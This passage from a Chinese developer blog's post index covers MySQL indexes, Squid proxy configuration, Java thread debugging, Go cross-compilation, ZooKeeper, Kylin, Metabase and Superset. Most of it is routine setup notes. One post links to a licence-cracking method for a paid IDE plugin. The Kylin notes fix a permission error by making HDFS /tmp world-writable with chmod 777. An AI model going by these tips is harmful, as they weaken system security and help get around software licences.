BTree 索引相似，但是在叶子节点之间使用链表连接，可以提高范围查询操作的性能。B+Tree 索引可以用于大多数存储引擎。与 BTree 索引相比，B+Tree 索引可以支持更高的并发访问，因为它使用了更加高效的锁机制。</p><p>在实际应用中，选择合适的索引类型需要考虑多个因素，包括数据类型、查询类型、查询频率、数据量等。下面是一些选择索引类型的建议：</p><ul><li>如果需要进行全文搜索，使用 FULLTEXT 索引。</li><li>如果需要进行等值查询，使用 HASH 索引。</li><li>如果需要进行范围查询或排序操作，使用 BTREE 索引。</li><li>如果需要处理空间数据，使用 RTREE 索引。</li><li>如果需要支持高并发访问，可以考虑使用 BTree 或 B+Tree 索引。</li><li>如果需要在多个列上建立索引，可以考虑使用复合索引。</li></ul><p>虽然索引可以提高查询效率，但是过多的索引会增加数据的存储空间和维护成本，还会降低写入性能。</p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Squid 代理</title>
      <link href="/2018/01/12/Squid%20%E4%BB%A3%E7%90%86/"/>
      <url>/2018/01/12/Squid%20%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="Squid-配置-通用配置"><a href="#Squid-配置-通用配置" class="headerlink" title="Squid 配置(通用配置)"></a>Squid 配置(通用配置)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install squid</span><br><span class="line">service squid start</span><br></pre></td></tr></table></figure><p>默认squid监听的端口是3128，可根据需要修改，配置文件存储在 <code>/etc/squid/squid.conf</code>。<br>squid 需配置仅使用代理功能，不使用cache，配置文件中需禁用缓存,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cache deny all.</span><br></pre></td></tr></table></figure><p>设置高匿代理，禁止 <code>X-Forwarded-For</code> 和 <code>Via</code> 的HTTP头。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 配置高匿，不允许设置任何多余头信息，保持原请求header。</span><br><span class="line">request_header_access Via deny all</span><br><span class="line">request_header_access X-Forwarded-For deny all</span><br></pre></td></tr></table></figure><p>详情配置说明可参考官方文档。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Squid </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排查Java程序CPU占用过高的线程</title>
      <link href="/2018/01/11/%E6%8E%92%E6%9F%A5Java%E7%A8%8B%E5%BA%8FCPU%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E7%9A%84%E7%BA%BF%E7%A8%8B/"/>
      <url>/2018/01/11/%E6%8E%92%E6%9F%A5Java%E7%A8%8B%E5%BA%8FCPU%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E7%9A%84%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>基本思路是找到线程占用 CPU 过高的那个线程 ID，然后通过 dump 的线程栈来搜索想要的线程。</p><ul><li>jstack -l 10086 &gt; 10086.stack</li><li>使用 top -H -p PID 命令查看对应进程是哪个线程占用 CPU 过高。如果有 htop，也可以通过 htop 查询占有 CPU 高的线程 id</li><li>将线程的 pid 转成 16 进制，比如 8618 &#x3D; 0x21aa</li><li>到第一步 dump 出来的 10086.stack 里面找 0x21aa 就可以定位到具体是什么现场。</li></ul><p>这里提到一点就是，在启动线程的时候，最好手动给线程起上名字。</p><p>如果是线程池，也是一样起好名字。</p><p>Guava 中提供了，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ThreadFactory</span> <span class="variable">nameThreadFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadFactoryBuilder</span>().setNameFormat(<span class="string">&quot;thread - pool-%d&quot;</span>).build();</span><br><span class="line"><span class="type">ExecutorService</span> <span class="variable">executorService</span> <span class="operator">=</span> Executors.newSingleThreadExecutor(namedThreadFactory);</span><br></pre></td></tr></table></figure><p><img src="/assets/images/stack.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang 交叉编译跨平台的可执行程序 (Mac、Linux、Windows )</title>
      <link href="/2018/01/04/Golang%20%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E8%B7%A8%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%20(Mac%E3%80%81Linux%E3%80%81Windows%20)/"/>
      <url>/2018/01/04/Golang%20%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E8%B7%A8%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%20(Mac%E3%80%81Linux%E3%80%81Windows%20)/</url>
      
        <content type="html"><![CDATA[<h4 id="各平台的GOOS和GOARCH参考"><a href="#各平台的GOOS和GOARCH参考" class="headerlink" title="各平台的GOOS和GOARCH参考"></a>各平台的GOOS和GOARCH参考</h4><p>交叉编译依赖下面几个环境变量：</p><ul><li><code>$GOARCH</code> 目标平台（编译后的目标平台）的处理器架构（386、amd64、arm）</li><li><code>$GOOS</code> 目标平台（编译后的目标平台）的操作系统（darwin、freebsd、linux、windows）</li></ul><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OS ARCH OS version</span><br><span class="line">linux 386 / amd64 / arm &gt;= Linux 2.6</span><br><span class="line">darwin 386 / amd64 OS X (Snow Leopard + Lion)</span><br><span class="line">freebsd 386 / amd64 &gt;= FreeBSD 7</span><br><span class="line">windows 386 / amd64 &gt;= Windows 2000</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mac 下编译 Linux 和 Windows 64位可执行程序</span></span><br><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br><span class="line">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 下编译 Mac 和 Windows 64位可执行程序</span></span><br><span class="line">CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build main.go</span><br><span class="line">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows 下编译 Mac 64位 可执行程序</span></span><br><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=darwin</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows 下编译 Linux 64位可执行程序</span></span><br><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=linux</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不带前面参数的 go build 只是编译出开发环境适用的执行文件</span></span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/cactus/go-statsd-client/statsd&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//时间转化为string，layout必须为 &quot;2006-01-02 15:04:05&quot;</span></span><br><span class="line">    timeNow := time.Now().Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;health check at &quot;</span>, timeNow ,  <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// first create a client</span></span><br><span class="line">    client, err := statsd.NewClient(<span class="string">&quot;ip:8125&quot;</span>, <span class="string">&quot;modem&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// handle any errors</span></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// make sure to clean up</span></span><br><span class="line">    <span class="keyword">defer</span> client.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send a stat</span></span><br><span class="line">    client.Inc(<span class="string">&quot;health.offline&quot;</span>, <span class="number">1</span>, <span class="number">1.0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper的maxClientCnxns配置错误导致的拒绝服务</title>
      <link href="/2017/12/20/Zookeeper%E7%9A%84maxClientCnxns%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/"/>
      <url>/2017/12/20/Zookeeper%E7%9A%84maxClientCnxns%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>在最近的一个项目中，遇到一个问题，就是一边是连接 Zookeeper 做服务发现、一边是连接 Zookeeper 做 Kafka 的消费者。因为设计的时候，客户端会监听 N 多的 Topic，在最初测试的时候，没有发现什么异常，但是一导入线上数据就初出问题。总是会发现无法连接到 Zookeeper，导致不能正常启动 Kafka consumer 的情况。经过排查各种配置之后，发现了 <code>maxClientCnxns</code> 这一项配置。</p><p>注意，这里是指单 IP 的限制！</p><blockquote><p>Limits the number of concurrent connections (at the socket level) that a single client, identified by IP address, may make to a single member of the ZooKeeper ensemble. This is used to prevent certain classes of DoS attacks, including file descriptor exhaustion. The default is 60. Setting this to 0 entirely removes the limit on concurrent connections.</p><p>限制单个客户（通过 IP 地址识别）与 ZooKeeper 集合中的单个成员的并发连接数（套接字级别）。这是用来防止某些类型的 DoS 攻击，包括文件描述符的耗尽。默认值是 60。将此设置为 0 可以完全消除对并发连接的限制。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA Mybatis Plugin 3.21 破解方法</title>
      <link href="/2017/12/18/IDEA%20Mybatis%20Plugin%203.21%20%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95/"/>
      <url>/2017/12/18/IDEA%20Mybatis%20Plugin%203.21%20%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>有钱还是买正版的吧！</p><p>这里看看别人的思路。</p><ul><li><a href="https://www.awei.org/2017/11/08/idea-mybatis-plugin-3-21-po-jie-fang-fa/">IDEA Mybatis Plugin 3.21 破解方法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Kylin</title>
      <link href="/2017/12/05/Apache%20Kylin/"/>
      <url>/2017/12/05/Apache%20Kylin/</url>
      
        <content type="html"><![CDATA[<p>Kylin 的依赖于 Hive、HBase、Hadoop 的。所以配置起来相对是最复杂的。</p><ul><li><a href="http://blog.csdn.net/se7en_q/article/details/47258007">http://blog.csdn.net/se7en_q/article/details/47258007</a></li><li><a href="https://www.cnblogs.com/lzxlfly/p/7221890.html">https://www.cnblogs.com/lzxlfly/p/7221890.html</a></li><li><a href="https://www.cnblogs.com/hunttown/p/5803341.html">https://www.cnblogs.com/hunttown/p/5803341.html</a></li><li><a href="https://www.cnblogs.com/hmy-blog/p/6506417.html">https://www.cnblogs.com/hmy-blog/p/6506417.html</a></li><li><a href="http://blog.csdn.net/wzy0623/article/details/50685966">http://blog.csdn.net/wzy0623/article/details/50685966</a></li><li><a href="http://blog.csdn.net/wulantian/article/details/46341043">hadoop 能用到的系统端口</a></li></ul><p>遇到问题需要清楚 Job 生成的数据，这里官方文档写的没更新，用这个类执行。</p><pre><code>hbase org.apache.hadoop.util.RunJar lib/kylin-job-2.2.0.jar org.apache.kylin.storage.hbase.util.StorageCleanupJob --delete false</code></pre><span id="more"></span><p><code>/etc/profile</code> 的内容，KYLIN 环境需要的东西。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/product/jdk1.8.0_92</span><br><span class="line"><span class="built_in">export</span> ZOOKEEPER_HOME=/usr/local/product/zookeeper-3.4.11</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> HBASE_HOME=/usr/local/product/hbase-1.2.6</span><br><span class="line"><span class="built_in">export</span> HBASE_CLASSPATH=<span class="variable">$HBASE_HOME</span>/conf</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> HIVE_HOME=/usr/local/product/apache-hive-1.2.2-bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> HADOOP_HOME=/usr/local/product/hadoop-2.9.0</span><br><span class="line"><span class="built_in">export</span> HADOOP_COMMON_LIB_NATIVE_DIR=<span class="variable">$HADOOP_HOME</span>/lib/native</span><br><span class="line"><span class="built_in">export</span> HADOOP_OPTS=<span class="string">&quot;-Djava.library.path=<span class="variable">$HADOOP_HOME</span>/lib/native&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> KYLIN_HOME=/usr/local/product/apache-kylin-2.2.0-bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$ZOOKEEPER_HOME</span>/bin:<span class="variable">$HADOOP_HOME</span>/bin/:<span class="variable">$HIVE_HOME</span>/bin:<span class="variable">$HIVE_HOME</span>/conf:<span class="variable">$HBASE_HOME</span>/bin:<span class="variable">$KYLIN_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/bin</span><br><span class="line"><span class="built_in">export</span> PATH=/usr/local/lib:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>遇到的问题：</p><ul><li>Failed to find metadata store by url: kylin_metadata@hbase。后来进入 zookeeper，&#x2F;hbase&#x2F;table，发现 kylin_metadata 还在，删除掉后正常启动</li><li>9000 端口和 php-fpm 冲突，将 php-fpm 的端口、nginx 中代理的端口修改成另一个端口可解决。</li><li>配置 hive 时，需要使用 mysql 驱动，这个要改下配置和上传 mysql-connnector*.jar</li><li>在建立 cube 的时候非常慢，要有耐心。</li><li>Hadoop 中需要的 JAVA_HOME 配置。</li><li>Hadoop 需要启动 history 与 WebAppProxyServer。</li><li><a href="http://blog.csdn.net/fenghuibian/article/details/53689833">kylin 误删 hdfs 上 kylin_metadata 下数据出现 java.lang.IllegalStateException 错误</a></li><li>登陆的地址需要是，<a href="http://ip:7070/kylin%EF%BC%8C%E5%AF%86%E7%A0%81%EF%BC%8CKylin">http://ip:7070/kylin，密码，Kylin</a> 默认账号为：ADMIN，默认密码：KYLIN（区分大小写，必须全都大写）</li><li>如果 cube 在 build 中出现错误，需要在 monitor 中 discard 对应的 cube 才能重新 build</li><li>删除 model 前必须先 drop 掉里面的 cube，而 drop 掉 cube 前如果 cube 是 Ready 状态需要先 disable。</li><li>Kylin 使用 HBase 来进行存储，而不是普通的文件系统。Kylin 的配置文件 kylin.properties 中查看到：<code>kylin.metadata.url=kylin_metadata@hbase</code>。表示 Kylin 的元数据被保存在 HBase 的 kylin_metadata 表中。</li><li>Hive 没有<code>hdfs:/tmp</code>目录的权限，赋权限即可<code>hadoop dfs -chmod -R 777 /tmp</code>.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Permission denied: user=anonymous, access=EXECUTE, inode=&quot;/tmp&quot;:hadoop:supergroup:drwx------</span><br></pre></td></tr></table></figure><h2 id="The-metadata-store-in-hbase"><a href="#The-metadata-store-in-hbase" class="headerlink" title="The metadata store in hbase"></a>The metadata store in hbase</h2><p>kylin.metadata.url&#x3D;kylin_metadata@hbase</p><p>表示 Kylin 的元数据被保存在 HBase 的 kylin_metadata 表中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Hadoop 需要启动 history</span><br><span class="line">./mr-jobhistory-daemon.sh start historyserver</span><br><span class="line">./yarn-daemon.sh --config $HADOOP_CONF_DIR start proxyserver</span><br></pre></td></tr></table></figure><h3 id="格式化-Hadoop-的-NameNode"><a href="#格式化-Hadoop-的-NameNode" class="headerlink" title="格式化 Hadoop 的 NameNode"></a>格式化 Hadoop 的 NameNode</h3><ul><li>bin&#x2F;hadoop namenode -format。因为中途弄错了一个东西，导致想重新安装 kylin，折腾 N 多问题后，将所有的数据全部删除，忘记了格式化 namenode 导致 namenode 无法启动。</li></ul><h3 id="从-Kylin-元数据中清理掉无用的资源"><a href="#从-Kylin-元数据中清理掉无用的资源" class="headerlink" title="从 Kylin 元数据中清理掉无用的资源"></a>从 Kylin 元数据中清理掉无用的资源</h3><p>随着时间的推移，有些资源，比如字典、表的快照等变得无用了(cube 的 segment 被删除或合并了)，但是他们仍然占用空间。可以执行如下命令查找和清理无用的元数据：</p><ul><li>首先，执行检查，这是安全的操作，不会修改任何内容：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将需要被删除的资源(resources)罗列出来</span><br><span class="line">./bin/metastore.sh clean</span><br></pre></td></tr></table></figure><ul><li>在上面的命令中，添加<code>--delete true</code>参数，这样就会清理掉哪些无用的资源。切记，在这个命令操作之前，一定要备份 Kylin 元数据：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/metastore.sh clean --delete true</span><br></pre></td></tr></table></figure><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="http://kylin.apache.org/docs21/index.html">官方文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
            <tag> Apache Kylin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metabase</title>
      <link href="/2017/12/05/metabase/"/>
      <url>/2017/12/05/metabase/</url>
      
        <content type="html"><![CDATA[<p>官网：</p><ul><li><a href="https://hub.docker.com/r/metabase/metabase">https://hub.docker.com/r/metabase/metabase</a></li><li><a href="https://www.metabase.com/">https://www.metabase.com</a></li><li><a href="https://www.metabase.com/docs/latest/">https://www.metabase.com/docs/latest/</a></li></ul><p>官方文档写的很详细，几乎没有什么异常的配置，metabase 使用 Cojure和React 实现。</p><p>在使用过程中，出现了新增数据源，但是在新增Question的时候不能显示出来，但是过了一段时间后又显示出来了，可能是某个地方的缓存吧。</p><p>正常使用也非常简单，新增Question，然后选择数据源、过滤条件、聚合函数，保存Question后可以添加到Dashboard去。</p><p><img src="/assets/images/metabase-stats-dashboard.svg"></p><h3 id="The-Zen-of-Metabase"><a href="#The-Zen-of-Metabase" class="headerlink" title="The Zen of Metabase"></a>The Zen of Metabase</h3><ul><li>Give the user value as soon as possible</li><li>Structure things so that we can automagically infer things for the user</li><li>Don’t ask the user for information the system should already know</li><li>Make it easy for the user to do the right thing</li><li>Don’t leave the user booby traps</li><li>Go the extra mile to make the user experience pleasant</li></ul>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
            <tag> metabase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>superset</title>
      <link href="/2017/12/05/superset/"/>
      <url>/2017/12/05/superset/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker 安装</span></span><br><span class="line">https://hub.docker.com/r/amancevice/superset/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建管理员用户名和密码</span></span><br><span class="line">fabmanager create-admin --app superset</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化Superset</span></span><br><span class="line">superset db upgrade</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">装载初始化样例数据</span></span><br><span class="line">superset load_examples</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建默认角色和权限</span></span><br><span class="line">superset init</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动Superset</span></span><br><span class="line">superset runserver</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可能遇到的问题:</p><ul><li>生成分布柱状图的时候，x 轴默认被排序了，目前没好的方案。</li><li>乱码问题，设置连接的编码，格式参考 SqlAlchemy 格式。如：mysql:&#x2F;&#x2F;root:<a href="mailto:&#x58;&#88;&#x58;&#88;&#88;&#88;&#x58;&#x58;&#x58;&#x58;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#46;&#x31;">&#x58;&#88;&#x58;&#88;&#88;&#88;&#x58;&#x58;&#x58;&#x58;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#46;&#x31;</a>:3306&#x2F;info?charset&#x3D;utf8</li><li>参考链接，<a href="http://www.jianshu.com/p/d5978b439080">http://www.jianshu.com/p/d5978b439080</a></li><li>GitHub 官方，<a href="https://github.com/apache/incubator-superset">https://github.com/apache/incubator-superset</a></li></ul><p><img src="https://cloud.githubusercontent.com/assets/130878/20234704/0f40778c-a835-11e6-9556-983a62ea061b.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
            <tag> superset </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH原理与应用</title>
      <link href="/2017/11/07/SSH%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
      <url>/2017/11/07/SSH%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">远程登录</a></li><li><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html">远程操作与端口转发</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>valid-number at leetcode</title>
      <link href="/2017/08/31/valid-number%20at%20leetcode/"/>
      <url>/2017/08/31/valid-number%20at%20leetcode/</url>
      
        <content type="html"><![CDATA[<p>有穷状态自动机 DFA 解题、提供一个新的思路来判断是不是一个数字。</p><ul><li><a href="https://leetcode.com/problems/valid-number/description/">Leetcode Description</a></li><li><a href="https://leetcode.com/problems/valid-number/discuss/">Leetcode Discuss</a></li><li><a href="http://blog.csdn.net/yukuninfoaxiom/article/details/6057736">NFA&#x2F;DFA算法</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">isNumber</span>(<span class="params">self, s</span>):</span><br><span class="line">      <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">      :type s: str</span></span><br><span class="line"><span class="string">      :rtype: bool</span></span><br><span class="line"><span class="string">      &quot;&quot;&quot;</span></span><br><span class="line">      <span class="comment">#define a DFA</span></span><br><span class="line">      state = [&#123;&#125;, </span><br><span class="line">              &#123;<span class="string">&#x27;blank&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;sign&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;digit&#x27;</span>:<span class="number">3</span>, <span class="string">&#x27;.&#x27;</span>:<span class="number">4</span>&#125;, </span><br><span class="line">              &#123;<span class="string">&#x27;digit&#x27;</span>:<span class="number">3</span>, <span class="string">&#x27;.&#x27;</span>:<span class="number">4</span>&#125;,</span><br><span class="line">              &#123;<span class="string">&#x27;digit&#x27;</span>:<span class="number">3</span>, <span class="string">&#x27;.&#x27;</span>:<span class="number">5</span>, <span class="string">&#x27;e&#x27;</span>:<span class="number">6</span>, <span class="string">&#x27;blank&#x27;</span>:<span class="number">9</span>&#125;,</span><br><span class="line">              &#123;<span class="string">&#x27;digit&#x27;</span>:<span class="number">5</span>&#125;,</span><br><span class="line">              &#123;<span class="string">&#x27;digit&#x27;</span>:<span class="number">5</span>, <span class="string">&#x27;e&#x27;</span>:<span class="number">6</span>, <span class="string">&#x27;blank&#x27;</span>:<span class="number">9</span>&#125;,</span><br><span class="line">              &#123;<span class="string">&#x27;sign&#x27;</span>:<span class="number">7</span>, <span class="string">&#x27;digit&#x27;</span>:<span class="number">8</span>&#125;,</span><br><span class="line">              &#123;<span class="string">&#x27;digit&#x27;</span>:<span class="number">8</span>&#125;,</span><br><span class="line">              &#123;<span class="string">&#x27;digit&#x27;</span>:<span class="number">8</span>, <span class="string">&#x27;blank&#x27;</span>:<span class="number">9</span>&#125;,</span><br><span class="line">              &#123;<span class="string">&#x27;blank&#x27;</span>:<span class="number">9</span>&#125;]</span><br><span class="line">      currentState = <span class="number">1</span></span><br><span class="line">      <span class="keyword">for</span> c <span class="keyword">in</span> 